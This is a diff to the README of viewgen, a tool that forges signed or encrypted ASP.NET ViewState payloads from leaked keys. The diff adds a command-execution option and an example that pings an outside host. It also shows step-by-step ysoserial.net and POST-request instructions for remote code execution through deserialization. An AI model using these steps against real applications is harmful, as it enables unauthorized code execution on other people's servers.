@@ -18,24 +18,26 @@
 ### Usage
 ```bash
 $ viewstate -h
-usage: viewgen [-h] [-c WEBCONFIG] [-m MODIFIER] [--decode] [--guess]
-               [--check] [--vkey VKEY] [--valg VALG] [--dkey DKEY]
-               [--dalg DALG] [-e]
-               payload
+usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [-c COMMAND]
+               [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG]
+               [--dkey DKEY] [--dalg DALG] [-e]
+               [payload]
 
 viewgen is a ViewState tool capable of generating both signed and encrypted
 payloads with leaked validation keys or web.config files
 
 positional arguments:
-  payload               viewState payload (base 64 encoded)
+  payload               ViewState payload (base 64 encoded)
 
 optional arguments:
   -h, --help            show this help message and exit
-  -c WEBCONFIG, --webconfig WEBCONFIG
+  --webconfig WEBCONFIG
                         automatically load keys and algorithms from a
                         web.config file
   -m MODIFIER, --modifier MODIFIER
                         VIEWSTATEGENERATOR value
+  -c COMMAND, --command COMMAND
+                        Command to execute
   --decode              decode a ViewState payload
   --guess               guess signature and encryption mode for a given
                         payload
@@ -80,10 +82,18 @@ DES/3DES SHA1
 
 Leaking the `web.config` file or validation keys from ASP.NET apps results in RCE via ObjectStateFormatter deserialization if ViewStates are used.
 
+You can use the built-in `command` option to generate a payload:
+
+```bash
+$ viewgen --webconfig web.config -m CA0B0334 -c "ping pwning.re"
+```
+
+However, you can also generate it manually:
+
 **1 -** Generate a payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net):
 
 ```bash
-ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping x.x.x.x"
+> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping x.x.x.x"
 ```
 
 **2 -** Grab a modifier (`__VIEWSTATEGENERATOR` value) from a given endpoint of the webapp
@@ -91,7 +101,7 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping 
 **3 -** Generate the signed/encrypted payload:
 
 ```bash
-viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
+$ viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
 ```
 
 **4 -** Send a POST request with the generated ViewState to the same endpoint
@@ -106,7 +116,9 @@ viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
 - [@orange_8361](https://twitter.com/orange_8361)
 - [@smiegles](https://twitter.com/smiegles)
 
-**CTF Writeups**
+---------------
+
+**CTF Writeups about this technique**
 
 - https://xz.aliyun.com/t/3019
 - https://cyku.tw/ctf-hitcon-2018-why-so-serials/
